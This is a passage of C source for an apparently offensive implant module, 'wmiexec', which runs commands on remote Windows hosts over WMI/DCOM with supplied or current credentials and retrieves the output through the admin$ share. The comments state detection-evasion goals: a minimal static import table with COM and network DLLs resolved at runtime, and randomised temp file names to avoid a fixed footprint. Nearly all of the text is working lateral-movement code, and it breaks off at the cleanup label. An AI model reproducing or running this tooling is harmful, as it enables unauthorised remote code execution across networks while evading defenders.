/*
 * csdev :: wmi.c  --  native wmiexec (WMI / DCOM Win32_Process::Create)
 * ==========================================================================
 * Lateral movement over WMI, no sc.exe / wmic.exe / powershell subprocess:
 *
 *   CoInitializeEx + CoInitializeSecurity
 *     -> CoCreateInstance(CLSID_WbemLocator)
 *     -> IWbemLocator::ConnectServer("\\\\host\\root\\cimv2", user, pass, domain)
 *     -> CoSetProxyBlanket
 *     -> IWbemServices::GetObject("Win32_Process")
 *     -> IWbemClassObject::GetMethod("Create") -> SpawnInstance -> Put("CommandLine")
 *     -> IWbemServices::ExecMethod("Win32_Process", "Create")
 *
 * WMI does not hand back stdout, so the command line given to the target
 * redirects both streams into \\host\admin$\Temp\<rand>.txt (psexec style) and
 * the file is copied back over SMB: plain UNC via kernel32 when the current
 * token works, or after mpr!WNetAddConnection2A when explicit credentials were
 * supplied. On the local host the file is read straight from
 * %SystemRoot%\Temp (falling back to %TEMP% when that directory is read-only).
 *
 * Acquisition / evasion constraints (project hard rule, see HANDOVER.md):
 *   - static import table must stay {ADVAPI32, KERNEL32, msvcrt, WINHTTP};
 *     ole32 / oleaut32 / mpr are resolved with LoadLibraryA + GetProcAddress.
 *   - this file is pure ASCII on purpose (HANDOVER pitfall #41: a non-ASCII
 *     comment once made gcc tokenise a C file wrongly, with errors landing in
 *     the middle of unrelated identifiers).
 *   - COM interfaces are private copies: including wbemcli.h would let mingw
 *     claim ABI names we then cannot redefine (HANDOVER pitfall #45).
 *
 * The vtable slot order below is NOT from memory. It was read out of
 * mingw's x86_64-w64-mingw32/include/wbemcli.h and is the ABI the WMI service
 * implements:
 *   IWbemLocator     : ConnectServer        = slot 3
 *   IWbemServices    : GetObject            = slot 6
 *                      ExecMethod           = slot 24
 *   IWbemClassObject : Get                 = slot 4
 *                      Put                  = slot 5
 *                      SpawnInstance        = slot 15
 *                      GetMethod            = slot 19
 * Likewise the three GUIDs are the ones declared there and byte-verified in
 * libwbemuuid.a; do not "fix" them from prose documentation.
 * ==========================================================================
 */
#include <windows.h>

#include "../crypto/crypto.h"   /* csdev_random: temp file name */
#include "wmi.h"

/* GetProcAddress results must go through a function pointer before being
 * called; the strict-aliasing warning gcc emits for that idiom is a
 * conservative false positive (same suppression as beacon2_ops.c). */
#if defined(__GNUC__)
#pragma GCC diagnostic ignored "-Wstrict-aliasing"
#endif

/* ------------------------------------------------------------- COM types */

typedef unsigned short *CSBSTR;

/* VARIANT, x64 ABI size 24: 8-byte header + 16-byte union. The WMI methods we
 * call only ever see VT_BSTR / VT_I4, but the trailing pad keeps the struct at
 * the real ABI size in case the service copies it. */
typedef struct {
    unsigned short vt;
    unsigned short r1;
    unsigned short r2;
    unsigned short r3;
    union { void *p; long l; } v;
    unsigned long long pad;
} CSVAR;

#define CSVT_I4   3
#define CSVT_BSTR 8

typedef struct CSLocator     CSLocator;
typedef struct CSServices    CSServices;
typedef struct CSClassObject CSClassObject;

typedef struct {
    HRESULT (WINAPI *QueryInterface)(CSLocator *This, const void *riid, void **ppv);
    unsigned long (WINAPI *AddRef)(CSLocator *This);
    unsigned long (WINAPI *Release)(CSLocator *This);
    HRESULT (WINAPI *ConnectServer)(CSLocator *This, const CSBSTR ns, const CSBSTR user,
                                    const CSBSTR pass, const CSBSTR locale, long flags,
                                    const CSBSTR authority, void *ctx, CSServices **ppSvc);
} CSLocatorVtbl;

struct CSLocator { const CSLocatorVtbl *lpVtbl; };

typedef struct {
    HRESULT (WINAPI *QueryInterface)(CSServices *This, const void *riid, void **ppv);
    unsigned long (WINAPI *AddRef)(CSServices *This);
    unsigned long (WINAPI *Release)(CSServices *This);
    HRESULT (WINAPI *OpenNamespace)(CSServices *This, const CSBSTR ns, long flags, void *ctx,
                                    CSServices **ppWork, void **ppResult);
    HRESULT (WINAPI *CancelAsyncCall)(CSServices *This, void *pSink);
    HRESULT (WINAPI *QueryObjectSink)(CSServices *This, long flags, void **ppSink);
    HRESULT (WINAPI *GetObject)(CSServices *This, const CSBSTR path, long flags, void *ctx,
                                CSClassObject **ppObject, void **ppCallResult);
    HRESULT (WINAPI *GetObjectAsync)(CSServices *This, const CSBSTR path, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *PutClass)(CSServices *This, CSClassObject *pObj, long flags, void *ctx, void **ppResult);
    HRESULT (WINAPI *PutClassAsync)(CSServices *This, CSClassObject *pObj, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *DeleteClass)(CSServices *This, const CSBSTR cls, long flags, void *ctx, void **ppResult);
    HRESULT (WINAPI *DeleteClassAsync)(CSServices *This, const CSBSTR cls, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *CreateClassEnum)(CSServices *This, const CSBSTR super, long flags, void *ctx, void **ppEnum);
    HRESULT (WINAPI *CreateClassEnumAsync)(CSServices *This, const CSBSTR super, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *PutInstance)(CSServices *This, CSClassObject *pInst, long flags, void *ctx, void **ppResult);
    HRESULT (WINAPI *PutInstanceAsync)(CSServices *This, CSClassObject *pInst, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *DeleteInstance)(CSServices *This, const CSBSTR path, long flags, void *ctx, void **ppResult);
    HRESULT (WINAPI *DeleteInstanceAsync)(CSServices *This, const CSBSTR path, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *CreateInstanceEnum)(CSServices *This, const CSBSTR filter, long flags, void *ctx, void **ppEnum);
    HRESULT (WINAPI *CreateInstanceEnumAsync)(CSServices *This, const CSBSTR filter, long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *ExecQuery)(CSServices *This, const CSBSTR lang, const CSBSTR query, long flags,
                                void *ctx, void **ppEnum);
    HRESULT (WINAPI *ExecQueryAsync)(CSServices *This, const CSBSTR lang, const CSBSTR query, long flags,
                                     void *ctx, void *pSink);
    HRESULT (WINAPI *ExecNotificationQuery)(CSServices *This, const CSBSTR lang, const CSBSTR query,
                                            long flags, void *ctx, void **ppEnum);
    HRESULT (WINAPI *ExecNotificationQueryAsync)(CSServices *This, const CSBSTR lang, const CSBSTR query,
                                                 long flags, void *ctx, void *pSink);
    HRESULT (WINAPI *ExecMethod)(CSServices *This, const CSBSTR path, const CSBSTR method, long flags,
                                 void *ctx, CSClassObject *pIn, CSClassObject **ppOut, void **ppCallResult);
    HRESULT (WINAPI *ExecMethodAsync)(CSServices *This, const CSBSTR path, const CSBSTR method, long flags,
                                      void *ctx, CSClassObject *pIn, void *pSink);
} CSServicesVtbl;

struct CSServices { const CSServicesVtbl *lpVtbl; };

typedef struct {
    HRESULT (WINAPI *QueryInterface)(CSClassObject *This, const void *riid, void **ppv);
    unsigned long (WINAPI *AddRef)(CSClassObject *This);
    unsigned long (WINAPI *Release)(CSClassObject *This);
    HRESULT (WINAPI *GetQualifierSet)(CSClassObject *This, void **ppQualSet);
    HRESULT (WINAPI *Get)(CSClassObject *This, const unsigned short *name, long flags, CSVAR *val,
                          long *type, long *flavor);
    HRESULT (WINAPI *Put)(CSClassObject *This, const unsigned short *name, long flags, CSVAR *val, long type);
    HRESULT (WINAPI *Delete)(CSClassObject *This, const unsigned short *name);
    HRESULT (WINAPI *GetNames)(CSClassObject *This, const unsigned short *q, long flags, CSVAR *qv, void **pNames);
    HRESULT (WINAPI *BeginEnumeration)(CSClassObject *This, long flags);
    HRESULT (WINAPI *Next)(CSClassObject *This, long flags, CSBSTR *name, CSVAR *val, long *type, long *flavor);
    HRESULT (WINAPI *EndEnumeration)(CSClassObject *This);
    HRESULT (WINAPI *GetPropertyQualifierSet)(CSClassObject *This, const unsigned short *prop, void **ppQualSet);
    HRESULT (WINAPI *Clone)(CSClassObject *This, CSClassObject **ppCopy);
    HRESULT (WINAPI *GetObjectText)(CSClassObject *This, long flags, CSBSTR *text);
    HRESULT (WINAPI *SpawnDerivedClass)(CSClassObject *This, long flags, CSClassObject **ppNewClass);
    HRESULT (WINAPI *SpawnInstance)(CSClassObject *This, long flags, CSClassObject **ppNewInst);
    HRESULT (WINAPI *CompareTo)(CSClassObject *This, long flags, CSClassObject *pCompareTo);
    HRESULT (WINAPI *GetPropertyOrigin)(CSClassObject *This, const unsigned short *name, CSBSTR *pstrClass);
    HRESULT (WINAPI *InheritsFrom)(CSClassObject *This, const unsigned short *strAncestor);
    HRESULT (WINAPI *GetMethod)(CSClassObject *This, const unsigned short *name, long flags,
                                CSClassObject **ppIn, CSClassObject **ppOut);
    HRESULT (WINAPI *PutMethod)(CSClassObject *This, const unsigned short *name, long flags,
                                CSClassObject *pIn, CSClassObject *pOut);
    HRESULT (WINAPI *DeleteMethod)(CSClassObject *This, const unsigned short *name);
    HRESULT (WINAPI *BeginMethodEnumeration)(CSClassObject *This, long flags);
    HRESULT (WINAPI *NextMethod)(CSClassObject *This, long flags, CSBSTR *name,
                                 CSClassObject **ppIn, CSClassObject **ppOut);
    HRESULT (WINAPI *EndMethodEnumeration)(CSClassObject *This);
    HRESULT (WINAPI *GetMethodQualifierSet)(CSClassObject *This, const unsigned short *method, void **ppQualSet);
    HRESULT (WINAPI *GetMethodOrigin)(CSClassObject *This, const unsigned short *name, CSBSTR *pstrClass);
} CSClassObjectVtbl;

struct CSClassObject { const CSClassObjectVtbl *lpVtbl; };

#define CS_CTX_ALL   5u                              /* INPROC_SERVER | LOCAL_SERVER */
#define CS_AUTHN_WINNT      10u                      /* RPC_C_AUTHN_WINNT */
#define CS_AUTHZ_NONE        0u
#define CS_AUTHN_LEVEL_CALL  3u                      /* RPC_C_AUTHN_LEVEL_CALL */
#define CS_IMP_LEVEL_IMPERSONATE 3u                  /* RPC_C_IMP_LEVEL_IMPERSONATE */
#define CS_EOAC_NONE         0u

/* ------------------------------------------------------ runtime symbols */

typedef struct {
    HMODULE hOle32;
    HMODULE hOleAut;
    HMODULE hMpr;

    HRESULT (WINAPI *CoInitializeEx)(void *reserved, DWORD model);
    HRESULT (WINAPI *CoInitializeSecurity)(void *secDesc, long cAuthSvc, void *asAuthSvc,
                                           void *reserved1, DWORD authnLevel, DWORD impLevel,
                                           void *authList, DWORD capabilities, void *reserved3);
    HRESULT (WINAPI *CoCreateInstance)(const void *rclsid, void *outer, DWORD ctx,
                                       const void *riid, void **ppv);
    HRESULT (WINAPI *CoSetProxyBlanket)(void *proxy, DWORD authnSvc, DWORD authzSvc,
                                        unsigned short *princName, DWORD authnLevel,
                                        DWORD impLevel, void *authInfo, DWORD capabilities);
    void    (WINAPI *CoUninitialize)(void);

    CSBSTR  (WINAPI *SysAllocString)(const unsigned short *psz);
    void    (WINAPI *SysFreeString)(CSBSTR b);

    DWORD   (WINAPI *WNetAddConnection2A)(void *netResource, const char *password,
                                          const char *userName, DWORD flags);
    DWORD   (WINAPI *WNetCancelConnection2A)(const char *name, DWORD flags, BOOL force);
} WMI_DYN;

static WMI_DYN d;

static void w_load(void)
{
    if (d.hOle32) return;

    d.hOle32  = LoadLibraryA("ole32.dll");
    d.hOleAut = LoadLibraryA("oleaut32.dll");
    d.hMpr    = LoadLibraryA("mpr.dll");

    if (d.hOle32) {
        *(FARPROC *)&d.CoInitializeEx       = GetProcAddress(d.hOle32, "CoInitializeEx");
        *(FARPROC *)&d.CoInitializeSecurity = GetProcAddress(d.hOle32, "CoInitializeSecurity");
        *(FARPROC *)&d.CoCreateInstance     = GetProcAddress(d.hOle32, "CoCreateInstance");
        *(FARPROC *)&d.CoSetProxyBlanket    = GetProcAddress(d.hOle32, "CoSetProxyBlanket");
        *(FARPROC *)&d.CoUninitialize       = GetProcAddress(d.hOle32, "CoUninitialize");
    }
    if (d.hOleAut) {
        *(FARPROC *)&d.SysAllocString = GetProcAddress(d.hOleAut, "SysAllocString");
        *(FARPROC *)&d.SysFreeString  = GetProcAddress(d.hOleAut, "SysFreeString");
    }
    if (d.hMpr) {
        *(FARPROC *)&d.WNetAddConnection2A    = GetProcAddress(d.hMpr, "WNetAddConnection2A");
        *(FARPROC *)&d.WNetCancelConnection2A = GetProcAddress(d.hMpr, "WNetCancelConnection2A");
    }
}

/* ----------------------------------------------------- identity / GUIDs */

/* Byte-verified against libwbemuuid.a and wbemcli.h; see the file header. */
static const GUID CS_CLSID_WbemLocator =
    { 0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };
static const GUID CS_IID_IWbemLocator =
    { 0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };

/* NETRESOURCEA (private copy: mpr's header would pull in more than we need) */
typedef struct {
    DWORD scope;
    DWORD type;
    DWORD displayType;
    DWORD usage;
    char *localName;
    char *remoteName;
    char *provider;
} CS_NETRESOURCE;

#define CS_RESOURCETYPE_DISK 1u

/* ------------------------------------------------------------- helpers */

static unsigned int w_len(const char *s)
{
    unsigned int n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static void w_zero(void *p, unsigned int n)
{
    unsigned char *b = (unsigned char *)p;
    while (n--) *b++ = 0;
}

static void w_copy(char *dst, unsigned int cap, const char *src)
{
    unsigned int i = 0;
    if (cap == 0) return;
    if (!src) { dst[0] = 0; return; }
    while (src[i] && i + 1 < cap) { dst[i] = src[i]; i++; }
    dst[i] = 0;
}

/* append to a NUL terminated char buffer, returns the new length */
static unsigned int w_put(char *dst, unsigned int cap, unsigned int at, const char *s)
{
    unsigned int i;
    if (cap == 0) return at;
    if (!s) { if (at < cap) dst[at] = 0; return at; }
    for (i = 0; s[i] && at + 1 < cap; i++) dst[at++] = s[i];
    dst[at < cap ? at : cap - 1] = 0;
    return at;
}

static int w_eq(const char *a, const char *b)
{
    if (!a || !b) return 0;
    while (*a && *b) { if (*a != *b) return 0; a++; b++; }
    return *a == *b;
}

static int w_eqi(const char *a, const char *b)
{
    if (!a || !b) return 0;
    while (*a && *b) {
        char x = *a, y = *b;
        if (x >= 'A' && x <= 'Z') x = (char)(x + 32);
        if (y >= 'A' && y <= 'Z') y = (char)(y + 32);
        if (x != y) return 0;
        a++; b++;
    }
    return *a == *b;
}

/* append to the caller's output buffer (not NUL terminated, raw bytes) */
static unsigned int w_cat(unsigned char *out, unsigned int cap, unsigned int at, const char *s)
{
    unsigned int i;
    if (!s) return at;
    for (i = 0; s[i] && at < cap; i++) out[at++] = (unsigned char)s[i];
    return at;
}

static unsigned int w_u32(unsigned char *out, unsigned int cap, unsigned int at, unsigned int v)
{
    char t[12];
    int n = 0, k;
    if (v == 0) t[n++] = '0';
    while (v) { t[n++] = (char)('0' + (v % 10u)); v /= 10u; }
    for (k = n - 1; k >= 0; k--) if (at < cap) out[at++] = (unsigned char)t[k];
    return at;
}

static unsigned int w_hex(unsigned char *out, unsigned int cap, unsigned int at, unsigned long v)
{
    static const char hx[] = "0123456789abcdef";
    int k;
    at = w_cat(out, cap, at, "0x");
    for (k = 28; k >= 0; k -= 4) if (at < cap) out[at++] = (unsigned char)hx[(v >> k) & 0xful];
    return at;
}

static int w_bad(HRESULT hr)
{
    return ((long)hr < 0) ? 1 : 0;
}

static CSBSTR w_bstr(const char *s)
{
    unsigned short wbuf[2048];
    int n;
    if (!d.SysAllocString) return NULL;
    if (!s) s = "";
    n = MultiByteToWideChar(CP_ACP, 0, s, -1, wbuf, 2048);
    if (n <= 0) return NULL;
    return d.SysAllocString(wbuf);
}

static void w_free_bstr(CSBSTR b)
{
    if (b && d.SysFreeString) d.SysFreeString(b);
}

#define W_NOFILE ((unsigned int)-1)

/* read a (possibly UNC) file; W_NOFILE = missing, 0 = present but empty */
static unsigned int w_read_file(const char *path, unsigned char *out, unsigned int cap)
{
    HANDLE h;
    DWORD size, got = 0;

    if (!path || !path[0] || !out || cap == 0) return W_NOFILE;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return W_NOFILE;

    size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(h); return W_NOFILE; }
    if (size > cap) size = cap;
    if (size > 0) {
        if (!ReadFile(h, out, size, &got, NULL)) got = 0;
    }
    CloseHandle(h);
    return (unsigned int)got;
}

static int w_writable_dir(const char *dir)
{
    char probe[560];
    HANDLE h;
    unsigned int m = 0;

    m = w_put(probe, sizeof(probe), m, dir);
    m = w_put(probe, sizeof(probe), m, "\\.csdev_w");
    h = CreateFileA(probe, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    CloseHandle(h);
    DeleteFileA(probe);
    return 1;
}

/* The redirection target is emitted unquoted on purpose (see the command line
 * comment below), so a directory we accept must contain no spaces. */
static int w_clean_writable(const char *dir)
{
    unsigned int i;
    if (!dir || !dir[0]) return 0;
    for (i = 0; dir[i]; i++) if (dir[i] == ' ') return 0;
    return w_writable_dir(dir);
}

static int w_is_local(const char *host)
{
    char name[160];
    DWORD n;

    if (!host || !host[0]) return 0;
    if (w_eqi(host, "localhost") || w_eq(host, ".")) return 1;
    if (w_eq(host, "127.0.0.1")) return 1;
    if (w_eqi(host, "::1")) return 1;

    name[0] = 0;
    n = sizeof(name);
    if (GetComputerNameA(name, &n) && name[0]) {
        if (w_eqi(host, name)) return 1;
    }
    return 0;
}

/* ------------------------------------------------------------ the work */

unsigned int ops_wmiexec(const char *host, const char *user, const char *domain,
                         const char *pass, const char *cmd,
                         unsigned char *out, unsigned int cap)
{
    unsigned int at = 0;
    unsigned int i, k, m;
    int is_local = 0, com_inited = 0, com_usable = 0, smb_conn = 0;
    char rname[24];
    char tpath[560];        /* read side: where the output file really is */
    char upath[560];        /* redirect side: how the target writes it */
    char admin[520];        /* \\host\admin$ */
    char cmdline[1400];
    char fulluser[200];
    char ns[340];
    CSLocator *pLoc = NULL;
    CSServices *pSvc = NULL;
    CSClassObject *pClass = NULL, *pIn = NULL, *pInst = NULL, *pOut = NULL;
    CSBSTR bNs = NULL, bUser = NULL, bPass = NULL, bAuth = NULL, bPath = NULL;
    CSBSTR bMethod = NULL, bCmd = NULL;
    CSVAR var;
    HRESULT hr = 0;
    unsigned int retval = 0, pid = 0;
    int have_ret = 0, have_pid = 0;

    rname[0] = 0;
    tpath[0] = 0;
    upath[0] = 0;
    admin[0] = 0;
    cmdline[0] = 0;
    fulluser[0] = 0;
    ns[0] = 0;

    if (!host || !host[0] || !cmd || !cmd[0]) {
        return w_cat(out, cap, 0,
            "[-] usage: wmiexec [-u user] [-p pass] [-d domain] <host> <cmd>\r\n");
    }
    if (cap < 1024) return 0;

    w_load();
    if (!d.hOle32 || !d.CoInitializeEx || !d.CoCreateInstance) {
        return w_cat(out, cap, 0, "[-] ole32.dll unresolved, wmiexec needs COM\r\n");
    }

    /* -- random temp file name (fixed names are the classic footprint) -- */
    k = 0;
    {
        unsigned char rnd[8];
        static const char cs[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        if (csdev_random(rnd, sizeof(rnd))) {
            for (i = 0; i < sizeof(rnd) && k < 12; i++) {
                rname[k++] = cs[(unsigned int)rnd[i] % 36u];
            }
        }
        if (k == 0) {
            const char *fb = "csdevwtmp";
            for (i = 0; fb[i] && k < 12; i++) rname[k++] = fb[i];
        }
        rname[k] = 0;
    }

    is_local = w_is_local(host);

    m = 0;
    m = w_put(admin, sizeof(admin), m, "\\\\");
    m = w_put(admin, sizeof(admin), m, host);
    m = w_put(admin, sizeof(admin), m, "\\admin$");

    if (is_local) {
        char base[420];
        char dir[440];
        DWORD r;
        int ok = 0;

        /* Candidate order matters: the capture directory must be writable and
         * space free. %SystemRoot%\Temp first (that is what admin$ maps to on
         * the remote side, so local and remote behave the same), then %TEMP%,
         * then the fixed path as a last resort. */
        r = GetEnvironmentVariableA("SystemRoot", base, sizeof(base));
        if (r > 0 && r < sizeof(base)) {
            unsigned int q = 0;
            q = w_put(dir, sizeof(dir), q, base);
            q = w_put(dir, sizeof(dir), q, "\\Temp");
            ok = w_clean_writable(dir);
        }
        if (!ok) {
            r = GetEnvironmentVariableA("TEMP", base, sizeof(base));
            if (r > 0 && r < sizeof(base)) {
                w_copy(dir, sizeof(dir), base);
                ok = w_clean_writable(dir);
            }
        }
        if (!ok) w_copy(dir, sizeof(dir), "C:\\Windows\\Temp");

        m = 0;
        m = w_put(tpath, sizeof(tpath), m, dir);
        m = w_put(tpath, sizeof(tpath), m, "\\");
        m = w_put(tpath, sizeof(tpath), m, rname);
        m = w_put(tpath, sizeof(tpath), m, ".txt");
        w_copy(upath, sizeof(upath), tpath);
    } else {
        m = 0;
        m = w_put(upath, sizeof(upath), m, admin);
        m = w_put(upath, sizeof(upath), m, "\\Temp\\");
        m = w_put(upath, sizeof(upath), m, rname);
        m = w_put(upath, sizeof(upath), m, ".txt");
        w_copy(tpath, sizeof(tpath), upath);
    }

    /* -- command line handed to Win32_Process::Create --
     * The redirect target is deliberately NOT quoted. cmd.exe only preserves
     * quotes literally when the /c tail holds exactly two of them; adding a
     * quoted path takes that count to four whenever the operator's command is
     * itself quoted ("cmd /c ver"), and cmd then falls back to its legacy
     * behaviour of stripping the first and last quote -- which corrupts the
     * redirect target and the output file never appears. impacket emits the
     * same unquoted form, which is why the temp directory is chosen to be
     * space free (w_clean_writable). */
    m = 0;
    m = w_put(cmdline, sizeof(cmdline), m, "cmd.exe /Q /c ");
    m = w_put(cmdline, sizeof(cmdline), m, cmd);
    m = w_put(cmdline, sizeof(cmdline), m, " 1>");
    m = w_put(cmdline, sizeof(cmdline), m, upath);
    m = w_put(cmdline, sizeof(cmdline), m, " 2>&1");

    at = w_cat(out, cap, 0, "[*] wmiexec ");
    at = w_cat(out, cap, at, is_local ? "local " : "remote ");
    at = w_cat(out, cap, at, host);
    at = w_cat(out, cap, at, "  creds=");
    at = w_cat(out, cap, at, (user && user[0]) ? "explicit" : "current");
    at = w_cat(out, cap, at, "\r\n[*] capture: ");
    at = w_cat(out, cap, at, upath);
    at = w_cat(out, cap, at, "\r\n");

    /* -- hand the SMB session to the redirect target when we have creds -- */
    if (!is_local && d.WNetAddConnection2A && ((user && user[0]) || (pass && pass[0]))) {
        CS_NETRESOURCE res;
        DWORD rc;

        w_zero(&res, sizeof(res));
        res.type = CS_RESOURCETYPE_DISK;
        res.remoteName = admin;

        m = 0;
        if (domain && domain[0]) {
            m = w_put(fulluser, sizeof(fulluser), m, domain);
            m = w_put(fulluser, sizeof(fulluser), m, "\\");
        }
        m = w_put(fulluser, sizeof(fulluser), m, user ? user : "");

        rc = d.WNetAddConnection2A(&res, pass ? pass : "", fulluser, 0);
        if (rc == 0 || rc == 85) {           /* NO_ERROR | ERROR_ALREADY_ASSIGNED */
            smb_conn = 1;
        } else {
            at = w_cat(out, cap, at, "[!] admin$ connect failed, rc=");
            at = w_u32(out, cap, at, (unsigned int)rc);
            at = w_cat(out, cap, at, " (reading with the current token)\r\n");
        }
    }

    /* -- COM init -- */
    hr = d.CoInitializeEx(NULL, 0);          /* COINIT_MULTITHREADED */
    if ((unsigned long)hr == 0ul || (unsigned long)hr == 1ul) {  /* S_OK | S_FALSE */
        com_inited = 1;
        com_usable = 1;
    } else if ((unsigned long)hr == 0x80010106ul) {              /* RPC_E_CHANGED_MODE */
        com_usable = 1;                      /* COM is up in another model, keep it */
    } else {
        at = w_cat(out, cap, at, "[-] CoInitializeEx failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, "\r\n");
        goto done;
    }

    if (d.CoInitializeSecurity) {
        /* RPC_E_TOO_LATE is harmless: another module already set security. */
        d.CoInitializeSecurity(NULL, -1, NULL, NULL, 0, CS_IMP_LEVEL_IMPERSONATE,
                               NULL, CS_EOAC_NONE, NULL);
    }

    hr = d.CoCreateInstance(&CS_CLSID_WbemLocator, NULL, CS_CTX_ALL,
                            &CS_IID_IWbemLocator, (void **)&pLoc);
    if (w_bad(hr) || !pLoc) {
        at = w_cat(out, cap, at, "[-] CoCreateInstance(CLSID_WbemLocator) failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, " (WMI service off?)\r\n");
        goto done;
    }

    m = 0;
    m = w_put(ns, sizeof(ns), m, "\\\\");
    m = w_put(ns, sizeof(ns), m, host);
    m = w_put(ns, sizeof(ns), m, "\\root\\cimv2");

    bNs   = w_bstr(ns);
    bUser = (user && user[0]) ? w_bstr(user) : NULL;
    bPass = (pass && pass[0]) ? w_bstr(pass) : NULL;
    bAuth = (domain && domain[0]) ? w_bstr(domain) : NULL;
    if (!bNs) {
        at = w_cat(out, cap, at, "[-] BSTR allocation failed\r\n");
        goto done;
    }

    hr = pLoc->lpVtbl->ConnectServer(pLoc, bNs, bUser, bPass, NULL, 0, bAuth, NULL, &pSvc);
    if (w_bad(hr) || !pSvc) {
        at = w_cat(out, cap, at, "[-] ConnectServer failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, " (check creds / admin rights / 135+445 reachability)\r\n");
        goto done;
    }

    at = w_cat(out, cap, at, "[+] connected ");
    at = w_cat(out, cap, at, ns);
    at = w_cat(out, cap, at, "\r\n");

    if (d.CoSetProxyBlanket) {
        d.CoSetProxyBlanket((void *)pSvc, CS_AUTHN_WINNT, CS_AUTHZ_NONE, NULL,
                            CS_AUTHN_LEVEL_CALL, CS_IMP_LEVEL_IMPERSONATE, NULL, CS_EOAC_NONE);
    }

    bPath   = w_bstr("Win32_Process");
    bMethod = w_bstr("Create");
    if (!bPath || !bMethod) {
        at = w_cat(out, cap, at, "[-] BSTR allocation failed\r\n");
        goto done;
    }

    hr = pSvc->lpVtbl->GetObject(pSvc, bPath, 0, NULL, &pClass, NULL);
    if (w_bad(hr) || !pClass) {
        at = w_cat(out, cap, at, "[-] GetObject(Win32_Process) failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, "\r\n");
        goto done;
    }

    hr = pClass->lpVtbl->GetMethod(pClass, L"Create", 0, &pIn, NULL);
    if (w_bad(hr) || !pIn) {
        at = w_cat(out, cap, at, "[-] GetMethod(Create) failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, "\r\n");
        goto done;
    }

    hr = pIn->lpVtbl->SpawnInstance(pIn, 0, &pInst);
    if (w_bad(hr) || !pInst) {
        at = w_cat(out, cap, at, "[-] SpawnInstance failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, "\r\n");
        goto done;
    }

    bCmd = w_bstr(cmdline);
    if (!bCmd) {
        at = w_cat(out, cap, at, "[-] BSTR allocation failed\r\n");
        goto done;
    }

    w_zero(&var, sizeof(var));
    var.vt = CSVT_BSTR;
    var.v.p = (void *)bCmd;
    hr = pInst->lpVtbl->Put(pInst, L"CommandLine", 0, &var, 0);
    if (w_bad(hr)) {
        at = w_cat(out, cap, at, "[-] Put(CommandLine) failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, "\r\n");
        goto done;
    }

    hr = pSvc->lpVtbl->ExecMethod(pSvc, bPath, bMethod, 0, NULL, pInst, &pOut, NULL);
    if (w_bad(hr)) {
        at = w_cat(out, cap, at, "[-] ExecMethod(Win32_Process::Create) failed hr=");
        at = w_hex(out, cap, at, (unsigned long)hr);
        at = w_cat(out, cap, at, "\r\n");
        goto done;
    }

    if (pOut) {
        CSVAR vr, vp;
        w_zero(&vr, sizeof(vr));
        w_zero(&vp, sizeof(vp));
        if (!w_bad(pOut->lpVtbl->Get(pOut, L"ReturnValue", 0, &vr, NULL, NULL))) {
            if (vr.vt == CSVT_I4) { retval = (unsigned int)vr.v.l; have_ret = 1; }
            else if (vr.vt == CSVT_BSTR && vr.v.p) w_free_bstr((CSBSTR)vr.v.p);
        }
        if (!w_bad(pOut->lpVtbl->Get(pOut, L"ProcessId", 0, &vp, NULL, NULL))) {
            if (vp.vt == CSVT_I4) { pid = (unsigned int)vp.v.l; have_pid = 1; }
            else if (vp.vt == CSVT_BSTR && vp.v.p) w_free_bstr((CSBSTR)vp.v.p);
        }
    }

    at = w_cat(out, cap, at, "[+] Win32_Process::Create executed  ReturnValue=");
    if (have_ret) at = w_u32(out, cap, at, retval); else at = w_cat(out, cap, at, "?");
    at = w_cat(out, cap, at, "  ProcessId=");
    if (have_pid) at = w_u32(out, cap, at, pid); else at = w_cat(out, cap, at, "?");
    at = w_cat(out, cap, at, (have_ret && retval == 0) ? "  (spawned)\r\n" : "  (non-zero = refused)\r\n");

    /* -- pull the redirected output back -- */
    {
        unsigned int got = W_NOFILE;
        int tries;

        for (tries = 0; tries < 24; tries++) {             /* <= 6 s */
            got = w_read_file(tpath, out + at, cap - at);
            if (got != W_NOFILE) break;
            Sleep(250);
        }
        if (got != W_NOFILE) {
            unsigned int again;
            Sleep(350);                                    /* let the writer flush */
            again = w_read_file(tpath, out + at, cap - at);
            if (again != W_NOFILE && again >= got) got = again;
        }

        if (got == W_NOFILE) {
            at = w_cat(out, cap, at, "[!] no output file at ");
            at = w_cat(out, cap, at, tpath);
            at = w_cat(out, cap, at, " (share unreachable or command still running)\r\n");
        } else if (got == 0) {
            at = w_cat(out, cap, at, "[*] command returned no output\r\n");
        } else {
            at += got;
            at = w_cat(out, cap, at, "\r\n[*] ");
            at = w_u32(out, cap, at, got);
            at = w_cat(out, cap, at, " bytes captured\r\n");
        }
    }

done:
    /* Only complain when the file really exists and cannot be removed. On the
     * failure paths the command never ran, so the capture file was never
     * created and a failed DeleteFileA means "nothing to clean", not a leak. */
